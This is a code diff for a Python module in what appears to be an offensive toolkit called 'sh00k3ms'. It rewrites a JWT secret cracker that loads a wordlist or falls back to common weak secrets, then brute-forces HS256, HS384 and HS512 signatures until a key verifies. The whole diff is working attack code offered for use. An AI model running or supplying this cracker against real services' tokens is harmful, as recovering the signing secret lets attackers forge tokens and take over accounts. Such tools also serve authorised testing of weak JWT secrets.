@@ -1,61 +1,44 @@
+from __future__ import annotations
+import os
+from typing import Iterable, List
 import jwt
-import threading
-from datetime import datetime
 
-lock = threading.Lock()
-found = False
-results = []
+WORDLIST_CANDIDATES: List[str] = [
+    "jwt_secrets_wordlist.txt",
+    os.path.join(os.path.dirname(__file__), "..", "jwt_secrets_wordlist.txt"),
+]
 
-def try_key(token, key, algo):
-    global found
-    if found:
-        return
-    try:
-        jwt.decode(token, key.strip(), algorithms=[algo])
-        with lock:
-            found = True
-            results.append({
-                "secret": key.strip(),
-                "timestamp": datetime.utcnow().isoformat()
-            })
-            print(f"[+] Secret found: {key.strip()}")
-    except jwt.exceptions.InvalidSignatureError:
-        pass
-    except Exception as e:
-        with lock:
-            results.append({"error": str(e)})
+ALGS = ["HS256", "HS384", "HS512"]
 
-def run_jwt_cracker():
-    print("\n--- JWT Cracker ---")
-    token = input("Enter JWT token: ").strip()
-    wordlist_path = input("Enter path to wordlist: ").strip()
-    algo = input("Enter JWT algorithm [default: HS256]: ").strip().upper()
-    algo = algo if algo else "HS256"
+def _load_wordlist() -> Iterable[str]:
+    for path in WORDLIST_CANDIDATES:
+        path = os.path.abspath(path)
+        if os.path.exists(path):
+            with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    w = line.strip()
+                    if w:
+                        yield w
+            return
+    # fallback small set
+    for w in ("secret", "password", "changeme", "admin", "jwtsecret"):
+        yield w
 
-    try:
-        with open(wordlist_path, "r") as f:
-            keys = f.readlines()
-    except FileNotFoundError:
-        print("[!] Wordlist file not found.")
+def run_jwt_cracker(token: str | None = None) -> None:
+    if not token:
+        print("Usage: sh00k3ms jwt crack <token>")
         return
 
-    threads = []
-    for key in keys:
-        if found:
-            break
-        t = threading.Thread(target=try_key, args=(token, key, algo))
-        t.start()
-        threads.append(t)
-
-    for t in threads:
-        t.join()
-
-    with open("jwt_crack_results.txt", "w") as f:
-        for r in results:
-            f.write(str(r) + "\n")
-
-    if not found:
-        print("[!] No valid secret found.")
-    else:
-        print("[+] JWT crack complete. Results saved to jwt_crack_results.txt.")
-
+    print(f"[+] Token length: {len(token)}")
+    tried = 0
+    for key in _load_wordlist():
+        tried += 1
+        for alg in ALGS:
+            try:
+                jwt.decode(token, key, algorithms=[alg])
+                print(f"[✓] KEY FOUND: '{key}' (alg={alg})")
+                print("[i] NOTE: works only for HMAC (HS*) tokens, not RS*/ES* public-key JWTs.")
+                return
+            except jwt.InvalidTokenError:
+                continue
+    print(f"[x] No key found after {tried} guesses.")
